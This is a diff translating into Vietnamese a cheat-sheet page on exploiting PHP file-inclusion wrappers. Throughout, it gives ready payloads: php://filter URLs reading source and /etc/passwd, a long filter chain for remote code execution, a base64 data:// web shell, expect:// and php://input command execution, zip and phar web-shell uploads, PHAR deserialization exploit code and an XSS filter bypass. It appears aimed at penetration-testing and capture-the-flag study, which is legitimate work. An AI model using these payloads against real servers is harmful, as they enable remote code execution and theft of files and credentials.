@@ -1,8 +1,8 @@
-# Inclusion Using Wrappers
+# Inclusion Using Wrappers (Chèn Tệp Sử Dụng Wrapper)
 
-A wrapper in the context of file inclusion vulnerabilities refers to the protocol or method used to access or include a file. Wrappers are often used in PHP or other server-side languages to extend how file inclusion functions, enabling the use of protocols like HTTP, FTP, and others in addition to the local filesystem.
+Wrapper trong ngữ cảnh của các lỗ hổng file inclusion đề cập đến giao thức hoặc phương thức được dùng để truy cập hoặc nhúng (include) một tệp. Wrapper thường được sử dụng trong PHP hoặc các ngôn ngữ phía server khác để mở rộng cách các hàm file inclusion hoạt động, cho phép sử dụng các giao thức như HTTP, FTP, và các giao thức khác ngoài hệ thống tệp cục bộ.
 
-## Summary
+## Tóm tắt
 
 - [Wrapper php://filter](#wrapper-phpfilter)
 - [Wrapper data://](#wrapper-data)
@@ -10,22 +10,22 @@ A wrapper in the context of file inclusion vulnerabilities refers to the protoco
 - [Wrapper input://](#wrapper-input)
 - [Wrapper zip://](#wrapper-zip)
 - [Wrapper phar://](#wrapper-phar)
-    - [PHAR Archive Structure](#phar-archive-structure)
+    - [Cấu trúc PHAR Archive](#phar-archive-structure)
     - [PHAR Deserialization](#phar-deserialization)
-- [Wrapper convert.iconv:// and dechunk://](#wrapper-converticonv-and-dechunk)
-    - [Leak file content from error-based oracle](#leak-file-content-from-error-based-oracle)
-    - [Leak file content inside a custom format output](#leak-file-content-inside-a-custom-format-output)
-- [References](#references)
+- [Wrapper convert.iconv:// và dechunk://](#wrapper-converticonv-and-dechunk)
+    - [Rò rỉ nội dung tệp từ error-based oracle](#leak-file-content-from-error-based-oracle)
+    - [Rò rỉ nội dung tệp bên trong một định dạng đầu ra tùy chỉnh](#leak-file-content-inside-a-custom-format-output)
+- [Tài liệu tham khảo](#references)
 
 ## Wrapper php://filter
 
-The part "`php://filter`" is case insensitive
+Phần "`php://filter`" không phân biệt chữ hoa chữ thường
 
-| Filter                                                       | Description                                  |
+| Filter                                                       | Mô tả                                  |
 | ------------------------------------------------------------ | -------------------------------------------- |
-| `php://filter/read=string.rot13/resource=index.php`          | Display index.php as rot13                   |
-| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` | Encode index.php from utf8 to utf16          |
-| `php://filter/convert.base64-encode/resource=index.php`      | Display index.php as a base64 encoded string |
+| `php://filter/read=string.rot13/resource=index.php`          | Hiển thị index.php dưới dạng rot13                   |
+| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` | Mã hóa index.php từ utf8 sang utf16          |
+| `php://filter/convert.base64-encode/resource=index.php`      | Hiển thị index.php dưới dạng chuỗi mã hóa base64 |
 
 ```powershell
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
@@ -34,25 +34,25 @@ http://example.com/index.php?page=php://filter/convert.base64-encode/resource=in
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
 ```
 
-Wrappers can be chained with a compression wrapper for large files.
+Các wrapper có thể được nối chuỗi (chained) với một wrapper nén dành cho các tệp lớn.
 
 ```powershell
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-NOTE: Wrappers can be chained multiple times using `|` or `/`:
+LƯU Ý: Các wrapper có thể được nối chuỗi nhiều lần bằng cách sử dụng `|` hoặc `/`:
 
-- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
-- deflate then `base64encode` (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`
+- Nhiều lần base64 decode: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
+- deflate sau đó `base64encode` (hữu ích cho việc rò rỉ dữ liệu với số ký tự giới hạn): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`
 
 ```powershell
 ./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
 curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
 ```
 
-Also there is a way to turn the `php://filter` into a full RCE.
+Ngoài ra còn có một cách để biến `php://filter` thành RCE hoàn chỉnh.
 
-- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - A CLI to generate PHP filters chain
+- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - Một CLI để tạo chuỗi PHP filter
 
   ```powershell
   $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
@@ -60,7 +60,7 @@ Also there is a way to turn the `php://filter` into a full RCE.
   php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
   ```
 
-- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) to generate a custom payload.
+- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) để tạo một payload tùy chỉnh.
 
   ```powershell
   # vulnerable file: index.php
@@ -72,17 +72,17 @@ Also there is a way to turn the `php://filter` into a full RCE.
 
 ## Wrapper data://
 
-The payload encoded in base64 is "`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`".
+Payload được mã hóa base64 là "`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`".
 
 ```powershell
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 ```
 
-Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`
+Sự thật thú vị: bạn có thể kích hoạt một XSS và vượt qua Chrome Auditor với: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`
 
 ## Wrapper expect://
 
-When used in PHP or a similar application, it may allow an attacker to specify commands to execute in the system's shell, as the `expect://` wrapper can invoke shell commands as part of its input.
+Khi được sử dụng trong PHP hoặc một ứng dụng tương tự, nó có thể cho phép kẻ tấn công chỉ định các lệnh để thực thi trong shell của hệ thống, vì wrapper `expect://` có thể gọi các lệnh shell như một phần của đầu vào của nó.
 
 ```powershell
 http://example.com/index.php?page=expect://id
@@ -91,13 +91,13 @@ http://example.com/index.php?page=expect://ls
 
 ## Wrapper input://
 
-Specify your payload in the POST parameters, this can be done with a simple `curl` command.
+Chỉ định payload của bạn trong các tham số POST, điều này có thể được thực hiện bằng một lệnh `curl` đơn giản.
 
 ```powershell
 curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
 ```
 
-Alternatively, Kadimus has a module to automate this attack.
+Ngoài ra, Kadimus có một module để tự động hóa cuộc tấn công này.
 
 ```powershell
 ./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
@@ -105,8 +105,8 @@ Alternatively, Kadimus has a module to automate this attack.
 
 ## Wrapper zip://
 
-- Create an evil payload: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
-- Zip the file
+- Tạo một payload độc hại: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
+- Nén tệp thành zip
 
   ```python
   zip payload.zip payload.php;
@@ -114,7 +114,7 @@ Alternatively, Kadimus has a module to automate this attack.
   rm payload.php
   ```
 
-- Upload the archive and access the file using the wrappers:
+- Tải lên archive và truy cập tệp bằng wrapper:
 
   ```ps1
   http://example.com/index.php?page=zip://shell.jpg%23payload.php
@@ -122,11 +122,11 @@ Alternatively, Kadimus has a module to automate this attack.
 
 ## Wrapper phar://
 
-### PHAR archive structure
+### Cấu trúc PHAR archive
 
-PHAR files work like ZIP files, when you can use the `phar://` to access files stored inside them.
+Các tệp PHAR hoạt động giống như tệp ZIP, khi bạn có thể sử dụng `phar://` để truy cập các tệp được lưu trữ bên trong chúng.
 
-- Create a phar archive containing a backdoor file: `php --define phar.readonly=0 archive.php`
+- Tạo một phar archive chứa một tệp backdoor: `php --define phar.readonly=0 archive.php`
 
   ```php
   <?php
@@ -138,16 +138,16 @@ PHAR files work like ZIP files, when you can use the `phar://` to access files s
   ?>
   ```
 
-- Use the `phar://` wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`
+- Sử dụng wrapper `phar://`: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`
 
 ### PHAR deserialization
 
-:warning: This technique doesn't work on PHP 8+, the deserialization has been removed.
+:warning: Kỹ thuật này không hoạt động trên PHP 8+, tính năng deserialization đã bị loại bỏ.
 
-If a file operation is now performed on our existing phar file via the `phar://` wrapper, then its serialized meta data is unserialized. This vulnerability occurs in the following functions, including file_exists: `include`, `file_get_contents`, `file_put_contents`, `copy`, `file_exists`, `is_executable`, `is_file`, `is_dir`, `is_link`, `is_writable`, `fileperms`, `fileinode`, `filesize`, `fileowner`, `filegroup`, `fileatime`, `filemtime`, `filectime`, `filetype`, `getimagesize`, `exif_read_data`, `stat`, `lstat`, `touch`, `md5_file`, etc.
+Nếu một thao tác tệp hiện được thực hiện trên tệp phar hiện có của chúng ta thông qua wrapper `phar://`, thì metadata đã được tuần tự hóa (serialized) của nó sẽ bị giải tuần tự hóa (unserialized). Lỗ hổng này xảy ra trong các hàm sau, bao gồm cả file_exists: `include`, `file_get_contents`, `file_put_contents`, `copy`, `file_exists`, `is_executable`, `is_file`, `is_dir`, `is_link`, `is_writable`, `fileperms`, `fileinode`, `filesize`, `fileowner`, `filegroup`, `fileatime`, `filemtime`, `filectime`, `filetype`, `getimagesize`, `exif_read_data`, `stat`, `lstat`, `touch`, `md5_file`, v.v.
 
-This exploit requires at least one class with magic methods such as `__destruct()` or `__wakeup()`.
-Let's take this `AnyClass` class as example, which execute the parameter data.
+Cách khai thác này yêu cầu ít nhất một class có các magic method như `__destruct()` hoặc `__wakeup()`.
+Hãy lấy class `AnyClass` này làm ví dụ, nó thực thi tham số data.
 
 ```php
 class AnyClass {
@@ -165,7 +165,7 @@ class AnyClass {
 echo file_exists($_GET['page']);
 ```
 
-We can craft a phar archive containing a serialized object in its meta-data.
+Chúng ta có thể tạo ra một phar archive chứa một object đã được tuần tự hóa trong phần meta-data của nó.
 
 ```php
 // create new Phar
@@ -190,36 +190,36 @@ $phar->setMetadata($object);
 $phar->stopBuffering();
 ```
 
-Finally call the phar wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`
+Cuối cùng gọi wrapper phar: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`
 
-NOTE: you can use the `$phar->setStub()` to add the magic bytes of JPG file: `\xff\xd8\xff`
+LƯU Ý: bạn có thể sử dụng `$phar->setStub()` để thêm magic byte của tệp JPG: `\xff\xd8\xff`
 
 ```php
 $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
 ```
 
-## Wrapper convert.iconv:// and dechunk://
+## Wrapper convert.iconv:// và dechunk://
 
-### Leak file content from error-based oracle
+### Rò rỉ nội dung tệp từ error-based oracle
 
-- `convert.iconv://`: convert input into another folder (`convert.iconv.utf-16le.utf-8`)
-- `dechunk://`: if the string contains no newlines, it will wipe the entire string if and only if the string starts with A-Fa-f0-9
+- `convert.iconv://`: chuyển đổi đầu vào sang một dạng khác (`convert.iconv.utf-16le.utf-8`)
+- `dechunk://`: nếu chuỗi không chứa ký tự xuống dòng, nó sẽ xóa toàn bộ chuỗi nếu và chỉ nếu chuỗi bắt đầu bằng A-Fa-f0-9
 
-The goal of this exploitation is to leak the content of a file, one character at a time, based on the [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py) writeup.
+Mục tiêu của cách khai thác này là rò rỉ nội dung của một tệp, từng ký tự một, dựa trên bài viết [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py).
 
-**Requirements**:
+**Yêu cầu**:
 
-- Backend must not use `file_exists` or `is_file`.
-- Vulnerable parameter should be in a `POST` request.
-    - You can't leak more than 135 characters in a GET request due to the size limit
+- Backend không được sử dụng `file_exists` hoặc `is_file`.
+- Tham số dễ bị tấn công cần nằm trong một request `POST`.
+    - Bạn không thể rò rỉ nhiều hơn 135 ký tự trong một request GET do giới hạn kích thước
 
-The exploit chain is based on PHP filters: `iconv` and `dechunk`:
+Chuỗi khai thác này dựa trên các PHP filter: `iconv` và `dechunk`:
 
-1. Use the `iconv` filter with an encoding increasing the data size exponentially to trigger a memory error.
-2. Use the `dechunk` filter to determine the first character of the file, based on the previous error.
-3. Use the `iconv` filter again with encodings having different bytes ordering to swap remaining characters with the first one.
+1. Sử dụng filter `iconv` với một bảng mã (encoding) làm tăng kích thước dữ liệu theo cấp số nhân để kích hoạt lỗi bộ nhớ.
+2. Sử dụng filter `dechunk` để xác định ký tự đầu tiên của tệp, dựa trên lỗi trước đó.
+3. Sử dụng filter `iconv` lần nữa với các bảng mã có thứ tự byte khác nhau để hoán đổi các ký tự còn lại với ký tự đầu tiên.
 
-Exploit using [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), the script will use either the `HTTP status code: 500` or the time as an error-based oracle to determine the character.
+Khai thác bằng cách sử dụng [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), script sẽ sử dụng hoặc `HTTP status code: 500` hoặc thời gian như một error-based oracle để xác định ký tự.
 
 ```ps1
 $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
@@ -229,11 +229,11 @@ $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/tes
 [+] File /test leak is finished!
 ```
 
-### Leak file content inside a custom format output
+### Rò rỉ nội dung tệp bên trong một định dạng đầu ra tùy chỉnh
 
-- [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.
+- [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Tạo ra một chuỗi `php://filter` thêm một tiền tố và hậu tố vào nội dung của một tệp.
 
-To obtain the contents of some file, we would like to have: `{"message":"<file contents>"}`.
+Để lấy được nội dung của một tệp nào đó, chúng ta muốn có: `{"message":"<file contents>"}`.
 
 ```ps1
 ./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
@@ -241,7 +241,7 @@ To obtain the contents of some file, we would like to have: `{"message":"<file c
 ./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
 ```
 
-This can be used against vulnerable code like the following.
+Điều này có thể được sử dụng để chống lại đoạn mã dễ bị tấn công như sau.
 
 ```php
 <?php
@@ -251,7 +251,7 @@ This can be used against vulnerable code like the following.
 ?>
 ```
 
-### Leak file content using blind file read primitive
+### Rò rỉ nội dung tệp bằng blind file read primitive
 
 - [ambionics/lightyear](https://github.com/ambionics/lightyear)
 
@@ -261,7 +261,7 @@ code remote.py # edit Remote.oracle
 ./lightyear.py /etc/passwd # dump a file!
 ```
 
-## References
+## Tài liệu tham khảo
 
 - [Baby^H Master PHP 2017 - Orange Tsai (@orangetw) - December 5, 2021](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
 - [Iconv, set the charset to RCE: exploiting the libc to hack the php engine (part 1) - Charles Fol - May 27, 2024](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
